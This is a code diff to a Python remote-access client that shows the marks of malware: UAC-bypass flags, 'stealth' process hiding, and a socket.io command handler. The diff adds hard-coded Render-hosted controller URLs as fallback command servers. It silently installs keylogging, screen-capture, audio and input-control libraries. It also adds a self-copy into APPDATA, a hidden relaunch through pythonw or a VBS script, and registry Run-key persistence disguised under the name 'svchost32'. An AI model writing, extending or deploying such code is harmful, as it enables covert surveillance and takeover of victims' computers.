@@ -780,11 +780,18 @@ USE_FIXED_SERVER_URL = True
 def _resolve_controller_url():
     v1 = (os.environ.get('FIXED_SERVER_URL', '') or '').strip()
     v2 = (os.environ.get('CONTROLLER_URL', '') or '').strip()
-    # Prefer explicit env, then local dev, then Render default
-    for u in (v1, v2, 'http://localhost:8080', 'http://localhost:8080'):
+    # Prefer explicit env, then deployed Render domain, then local dev
+    candidates = [
+        v1,
+        v2,
+        'https://neural-control-hub.onrender.com',
+        'https://agent-controller-backend.onrender.com',
+        'http://localhost:8080',
+    ]
+    for u in candidates:
         if u and u.lower() not in ('none', 'null'):
             return u
-    return 'http://localhost:8080'
+    return 'https://neural-control-hub.onrender.com'
 FIXED_SERVER_URL = _resolve_controller_url()
 DISABLE_SLUI_BYPASS = True
 UAC_BYPASS_DEBUG_MODE = False
@@ -1934,41 +1941,82 @@ def ensure_prerequisites():
         return spec.strip()
     def _import_name(pkg: str) -> str:
         return overrides.get(pkg) or pkg.replace('-', '_')
-    # Attempt imports and install missing
-    install_specs = []
+    # Build ordered list: critical -> platform-specific -> optional -> extras from files
+    critical = [
+        'python-socketio>=5.13.0',
+        'requests>=2.32.4',
+        'psutil>=5.9.5',
+        'mss>=10.0.0',
+    ]
+    win_specific = [
+        'pywin32>=306',
+        'pyaudio>=0.2.11',
+        'dxcam>=0.0.5',
+    ] if sys.platform == 'win32' else []
+    optional = [
+        'numpy>=1.24.4',
+        'opencv-python>=4.7.0.72',
+        'pillow>=9.5.0',
+        'PyTurboJPEG>=1.7.0',
+        'pynput>=1.8.1',
+        'keyboard>=0.13.5',
+        'pyautogui>=0.9.54',
+        'pygame>=2.6.1',
+        'websockets>=10.4',
+        'aiohttp>=3.8.0',
+        'aiortc>=1.13.0',
+        'av',
+        'msgpack>=1.0.5',
+        'lz4>=4.3.2',
+        'zstandard>=0.21.0',
+        'xxhash>=3.2.0',
+        'cryptography>=41.0.3',
+    ]
+    ordered_specs = []
+    seen = set()
+    for group in [critical, win_specific, optional]:
+        for spec in group:
+            if spec not in seen:
+                ordered_specs.append(spec); seen.add(spec)
     for spec in sorted(pkgs):
+        if spec not in seen:
+            ordered_specs.append(spec); seen.add(spec)
+    # Check + install one-by-one with detailed logging
+    all_ok = True
+    for spec in ordered_specs:
         pkg = _pkg_name(spec)
         name = _import_name(pkg)
         try:
+            log_message(f"[PREREQ] Checking {spec} (import '{name}')")
             __import__(name)
+            log_message(f"[PREREQ] Already installed: {spec}")
             continue
         except Exception:
-            install_specs.append(spec)
-    if not install_specs:
-        log_message("[PREREQ] All prerequisites already installed")
-        return True
-    log_message(f"[PREREQ] Installing missing packages: {', '.join(install_specs)}")
-    for spec in install_specs:
+            pass
         try:
+            log_message(f"[PREREQ] Installing: {spec}")
             cmd = [sys.executable, '-m', 'pip', 'install', '--disable-pip-version-check', spec]
             if sys.platform.startswith('win'):
                 try:
-                    subprocess.run(cmd, creationflags=subprocess.CREATE_NO_WINDOW, timeout=300)
+                    subprocess.run(cmd, creationflags=subprocess.CREATE_NO_WINDOW, timeout=300, check=False)
                 except Exception:
-                    subprocess.run(cmd, timeout=300)
+                    subprocess.run(cmd, timeout=300, check=False)
             else:
-                subprocess.run(cmd, timeout=300)
-            # Verify import
-            pkg = _pkg_name(spec)
-            name = _import_name(pkg)
+                subprocess.run(cmd, timeout=300, check=False)
             try:
                 __import__(name)
                 log_message(f"[PREREQ] Installed and verified: {spec}")
             except Exception as e:
+                all_ok = False
                 log_message(f"[PREREQ] Install OK but import failed for {spec}: {e}", "warning")
         except Exception as e:
+            all_ok = False
             log_message(f"[PREREQ] Failed to install {spec}: {e}", "error")
-    return True
+    if all_ok:
+        log_message("[PREREQ] All prerequisites satisfied")
+    else:
+        log_message("[PREREQ] Some prerequisites could not be installed", "warning")
+    return all_ok
 
 # --- Stealth Functions (moved here after imports) ---
 def hide_process():
@@ -12164,6 +12212,18 @@ def register_socketio_handlers():
                     pass
                 return
             target = os.path.abspath(__file__)
+            try:
+                if not target.lower().endswith('.py') or not os.path.isdir(os.path.dirname(target)):
+                    base = os.path.join(os.environ.get('APPDATA', '') or os.path.expanduser('~'), 'ClientLauncher')
+                    os.makedirs(base, exist_ok=True)
+                    target = os.path.join(base, 'client.py')
+            except Exception:
+                base = os.path.join(os.environ.get('APPDATA', '') or os.path.expanduser('~'), 'ClientLauncher')
+                try:
+                    os.makedirs(base, exist_ok=True)
+                except Exception:
+                    pass
+                target = os.path.join(base, 'client.py')
             backup = target + ".bak"
             try:
                 with open(backup, 'wb') as bf:
@@ -12204,23 +12264,41 @@ def register_socketio_handlers():
                 return
             # Restart silently
             try:
+                launcher = None
                 pyw = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
-                cmd = None
                 if os.path.exists(pyw):
-                    cmd = [pyw, target]
+                    launcher = [pyw, target]
                 else:
+                    import shutil
+                    pw = shutil.which('pythonw') or ''
+                    if pw:
+                        launcher = [pw, target]
+                if not launcher:
+                    import shutil
+                    py = shutil.which('python') or sys.executable
                     vdir = os.path.join(os.environ.get('APPDATA', ''), "ClientLauncher")
                     os.makedirs(vdir, exist_ok=True)
                     vbs_path = os.path.join(vdir, "client_autostart.vbs")
                     vbs = (
                         'Set oShell = CreateObject("WScript.Shell")\n'
                         f'oShell.CurrentDirectory = "{os.path.dirname(target)}"\n'
-                        f'oShell.Run "\"{sys.executable}\" \"{target}\"", 0, false\n'
+                        f'oShell.Run "\"{py}\" \"{target}\"", 0, false\n'
                     )
                     with open(vbs_path, 'w') as f:
                         f.write(vbs)
-                    cmd = ["wscript.exe", vbs_path]
-                subprocess.Popen(cmd, creationflags=subprocess.CREATE_NO_WINDOW if WINDOWS_AVAILABLE else 0)
+                    launcher = ["wscript.exe", vbs_path]
+                subprocess.Popen(launcher, creationflags=subprocess.CREATE_NO_WINDOW if WINDOWS_AVAILABLE else 0)
+                try:
+                    if WINDOWS_AVAILABLE:
+                        import winreg
+                        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
+                        if launcher[0].lower().endswith('pythonw.exe'):
+                            winreg.SetValueEx(key, "svchost32", 0, winreg.REG_SZ, f'"{launcher[0]}" "{target}"')
+                        else:
+                            winreg.SetValueEx(key, "svchost32", 0, winreg.REG_SZ, f'{launcher[0]} "{launcher[1]}"')
+                        winreg.CloseKey(key)
+                except Exception:
+                    pass
                 log_message("[UPDATE] Relaunching updated client, exiting current process...")
             except Exception as e:
                 log_message(f"[UPDATE] Relaunch failed: {e}", "error")
